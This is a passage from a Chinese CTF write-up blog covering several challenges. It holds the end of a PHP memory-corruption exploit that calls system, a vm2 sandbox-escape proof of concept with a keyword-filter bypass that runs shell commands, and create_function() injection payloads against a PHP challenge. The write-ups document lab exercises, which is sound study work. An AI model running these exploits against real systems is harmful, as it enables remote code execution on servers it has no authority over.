function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># fake closure object</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment"># pwn</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># internal func type</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># internal func handler</span>    <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把命令改为/readflag并且使用蚁剑把poc上传并访问，成功拿到flag</p>        <h2 id="HFCTF2020-JustEscape"   >          <a href="#HFCTF2020-JustEscape" class="heading-link"><i class="fas fa-link"></i></a><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2>      <p>首页提示了可能不是php哦</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-05-10" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-05-10</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 01.09.27.png)</p><p>看wp说是node.js<del>本人完全没有接触过</del></p><p>测试使用Error().stack函数，发现确实是node.js，是VM2沙箱逃逸，<span class="exturl"><a class="exturl__link"   href="https://github.com/patriksimek/vm2/issues/225" >现成poc</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>直接使用</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">"use strict"</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span><span class="token constant">VM</span><span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vm2'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> untrusted <span class="token operator">=</span> <span class="token string">'('</span> <span class="token operator">+</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    TypeError<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">prototyp</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">e</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">get_process</span> <span class="token operator">=</span> <span class="token parameter">f</span><span class="token operator">=></span>f<span class="token punctuation">.</span><span class="token function">constructor</span><span class="token punctuation">(</span><span class="token string">"return process"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        Object<span class="token punctuation">.</span><span class="token function">preventExtensions</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> e<span class="token punctuation">.</span><span class="token function">get_process</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">+</span><span class="token string">')()'</span><span class="token punctuation">;</span><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">VM</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>untrusted<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是这题有关键字过滤，在这使用javascript的模版文字绕过，如</p><pre class="line-numbers language-none"><code class="language-none">prototype变成&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最终payload</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    TypeError<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">prototyp</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">e</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">get_proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token parameter">f</span><span class="token operator">=></span>f<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">constructo</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">r</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">return this.proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>        Object<span class="token punctuation">.</span><span class="token function">preventExtensions</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> e<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">get_proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>mainModule<span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">requir</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">e</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">child_proces</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">s</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">exe</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">cSync</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">cat /flag</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>        <h2 id="BJDCTF2020-EzPHP"   >          <a href="#BJDCTF2020-EzPHP" class="heading-link"><i class="fas fa-link"></i></a><a href="#BJDCTF2020-EzPHP" class="headerlink" title="[BJDCTF2020]EzPHP"></a>[BJDCTF2020]EzPHP</h2>      <p>看源码，base32解码后访问</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>          <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn't it ?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是绕呗</p><p><strong>P1</strong></p><p><code>$_SERVER[&quot;QUERY_STRING&quot;] </code>中是?后的内容，在直接读取时并不会进行url解码，但是在使用$_GET访问某一参数的时候会进行URL解码，在这里我们只需要对内容进行URL编码即可</p><p><strong>P2</strong></p><p>换行绕过</p><p><strong>P3</strong></p><p>在<code>$_REQUEST</code>中，POST的优先级大于GET传入的参量，所以我们再在POST中重新传一次同名参量就行</p><p><strong>P4</strong></p><p>伪协议绕过，记得URL编码</p><p><strong>P5</strong></p><p>SHA1强比较绕过，类似md5，用数组即可</p><p><strong>P6</strong></p><p>新知识：create_function()</p><blockquote><p>create_function()注入原理：</p><p>create_function()函数有两个参数<code>$args</code>和<code>$code</code>，用于创建一个lambda样式的函数，首先可以用create_function()创建一个简单函数</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$afunc</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a, $b'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'return ($a+$b);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$afunc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出3</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>而本题的$code(‘’, $arg); //此处存在create_function()注入中可以通过控制$arg来进行代码注入<br>首先保证传入的$code为create_funtion，<br>其次是$arg参数，本题中过滤了cat、flag、scan等关键字，无法直接命令执行得到flag的值，在网上查阅后找到了合适的函数get_defined_vars()直接输出所有变量，构造payload如下</p></blockquote><pre class="line-numbers language-none"><code class="language-none">fl%61g[c%6fde]&#x3D;create_function&amp;fl%61g[%61rg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然鹅还是拿不到flag，提示flag在<code>rea1fl4g.php</code>中，访问发现拿不到，应该是以变量形式放进去了，那么尝试包含这个文件并将所有变量打印出来应该就行了，include函数被ban，尝试require加base64编码</p><pre class="line-numbers language-none"><code class="language-none">fl%61g[%61rg]&#x3D;&#125;require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>给了个假的flag😅，读源码</p><pre class="line-numbers language-none"><code 